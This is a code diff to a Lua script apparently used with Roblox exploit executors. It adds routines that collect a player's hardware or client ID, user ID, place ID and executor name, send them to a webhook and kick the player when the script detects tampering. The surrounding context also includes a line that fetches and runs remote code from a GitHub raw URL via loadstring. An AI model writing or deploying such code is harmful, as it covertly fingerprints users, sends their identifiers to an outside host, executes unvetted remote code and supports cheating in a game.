@@ -10,24 +10,68 @@ local Players         = game:GetService("Players")
 local sendRequest     = request or http_request
 local payloadReported = false
 
--- Resolve HWID / client ID across common executor APIs (best effort).
+-- HWID: prefer Roblox's own client ID (UUID, cross-executor),
+-- fall back to executor HWID APIs, then "Unknown".
 local function resolveHwid()
+    local ok, clientId = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    if ok and clientId and tostring(clientId) ~= "" then
+        return tostring(clientId)
+    end
+
     local env = (getfenv and getfenv(0)) or _G
-    local candidates = {
-        env.gethwid,
-        env.get_hwid,
-        env.getclientid,
-        env.get_client_id,
-        env.syn_get_hwid,
-        env.getexecutorname,
+    local function tryCall(fn)
+        if type(fn) ~= "function" then return nil end
+        local ok2, value = pcall(fn)
+        if ok2 and value ~= nil and tostring(value) ~= "" then
+            return tostring(value)
+        end
+        return nil
+    end
+
+    local direct = {
+        env.gethwid, env.get_hwid, env.getclientid,
+        env.get_client_id, env.krnl_gethwid,
     }
-    for _, fn in ipairs(candidates) do
-        if type(fn) == "function" then
-            local ok, value = pcall(fn)
-            if ok and value ~= nil and tostring(value) ~= "" then
-                return tostring(value)
+    for _, fn in ipairs(direct) do
+        local v = tryCall(fn)
+        if v then return v end
+    end
+
+    if type(getgenv) == "function" then
+        local genv = getgenv()
+        if type(genv) == "table" then
+            for _, key in ipairs({"gethwid", "get_hwid", "getclientid", "get_client_id"}) do
+                local v = tryCall(genv[key])
+                if v then return v end
             end
         end
+    end
+
+    if type(env.syn) == "table" then
+        local v = tryCall(env.syn.get_hwid)
+        if v then return v end
+    end
+    if type(env.fluxus) == "table" then
+        local v = tryCall(env.fluxus.get_hwid)
+        if v then return v end
+    end
+
+    if type(env.secure_load) == "function" then
+        local ok2, value = pcall(env.secure_load, "return gethwid()")
+        if ok2 and value and tostring(value) ~= "" then
+            return tostring(value)
+        end
+    end
+
+    return "Unknown"
+end
+
+local function resolveExecutor()
+    if type(getexecutorname) == "function" then
+        local ok, v = pcall(getexecutorname)
+        if ok and v then return tostring(v) end
     end
     return "Unknown"
 end
@@ -39,9 +83,10 @@ local function reportTamper(reason)
     local player = Players.LocalPlayer
     if not player then return end
 
-    local userId  = player.UserId
-    local placeId = game.PlaceId
-    local hwid    = resolveHwid()
+    local userId   = player.UserId
+    local placeId  = game.PlaceId
+    local hwid     = resolveHwid()
+    local executor = resolveExecutor()
 
     if type(sendRequest) == "function" and WEBHOOK_URL ~= "" then
         task.spawn(function()
@@ -59,7 +104,8 @@ local function reportTamper(reason)
                             fields = {
                                 { name = "Roblox User ID",   value = tostring(userId) },
                                 { name = "Place ID",         value = tostring(placeId) },
-                                { name = "HWID / Client ID", value = hwid, inline = false },
+                                { name = "HWID (Client ID)", value = hwid, inline = false },
+                                { name = "Executor",         value = executor, inline = true },
                             },
                         }},
                     }),
@@ -72,8 +118,6 @@ local function reportTamper(reason)
         player:Kick("Script protection detected a modified environment.")
     end)
 end
-
--- Payload-side guard: verify the environment the payload runs in.
 do
     if type(isfunctionhooked) == "function"
         and type(sendRequest) == "function" then
@@ -84,8 +128,7 @@ do
         end
     end
 end
--- ============================================================
--- ... rest of your main yest5 script below ...
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/yuvic123/Unthinkable-Present/refs/heads/main/UP'))()
 local Players, Teleport, Http, Core = game:GetService("Players"), game:GetService("TeleportService"), game:GetService("HttpService"), game:GetService("CoreGui")
 local LocalPlayer, placeId = Players.LocalPlayer, game.PlaceId
